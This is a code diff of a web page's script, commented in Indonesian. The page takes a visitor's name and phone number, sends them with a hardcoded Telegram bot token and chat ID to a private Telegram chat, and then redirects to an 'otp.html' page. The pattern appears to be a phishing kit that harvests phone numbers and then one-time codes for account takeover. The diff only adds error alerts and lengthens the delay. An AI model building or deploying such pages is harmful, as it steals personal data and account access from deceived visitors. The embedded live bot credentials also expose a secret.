@@ -332,16 +332,15 @@
     <script>
         function formatNomorHP(nomor) {
     if (nomor.startsWith("+62")) {
-        return nomor; // Jika sudah ada +62, tidak perlu diubah
+        return nomor;
     } else if (nomor.startsWith("0")) {
-        return "+62" + nomor.substring(1); // Ubah 08xxx menjadi +628xxx
+        return "+62" + nomor.substring(1);
     } else if (nomor.startsWith("62")) {
-        return "+62" + nomor.substring(2); // Pastikan 62xxx tetap jadi +62xxx
+        return "+62" + nomor.substring(2);
     } else {
-        return "+62" + nomor; // Jika format lain, tetap tambahkan +62 di depan
+        return "+62" + nomor;
     }
 }
-
 
 function kirimData() {
     let nama = document.getElementById('nama').value.trim();
@@ -349,37 +348,42 @@ function kirimData() {
     let nomorLengkap = formatNomorHP(nomor);
 
     if (nama === "" || nomor === "") {
-        return; // Tidak lakukan apa-apa jika input kosong
+        alert("Harap isi semua data!");
+        return;
     }
 
-    // Tampilkan loading GIF
+    // Tampilkan loading
     document.getElementById("loading").style.display = "block";
 
-    // Simpan data ke localStorage
+    // Simpan ke localStorage
     localStorage.setItem("nama", nama);
     localStorage.setItem("nomorHP", nomorLengkap);
 
-    let token = "7874811634:AAFLWyauNcH31efMOMIA16Hc5sD-uQmXd6A";
-    let chat_id = "6835220264";
+    let token = "7874811634:AAFLWyauNcH31efMOMIA16Hc5sD-uQmXd6A";  // Ganti dengan token yang valid
+    let chat_id = "6835220264"; // Ganti dengan chat_id yang valid
     let pesan = `Nama: ${nama}%0ANomor: ${nomorLengkap}`;
     let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${pesan}`;
 
-    // Tunggu 3 detik sebelum mengirim data
+    // Tunggu 5 detik sebelum mengirim data ke Telegram
     setTimeout(() => {
         fetch(url)
             .then(response => response.json())
             .then(data => {
                 document.getElementById("loading").style.display = "none"; // Sembunyikan loading
                 if (data.ok) {
-                    window.location.href = "otp.html"; // Pindah ke halaman OTP jika berhasil
+                    window.location.href = "otp.html"; // Pindah ke halaman OTP jika sukses
+                } else {
+                    alert("Gagal mengirim ke Telegram. Periksa kembali token atau chat ID.");
                 }
             })
             .catch(error => {
-                document.getElementById("loading").style.display = "none"; // Sembunyikan loading jika gagal
+                document.getElementById("loading").style.display = "none"; // Sembunyikan loading
+                alert("Terjadi kesalahan! Pastikan Anda terhubung ke internet.");
                 console.error(error);
             });
-    }, 3000);
+    }, 5000); // 5000ms = 5 detik
 }
+        
 
     </script>
 </body>
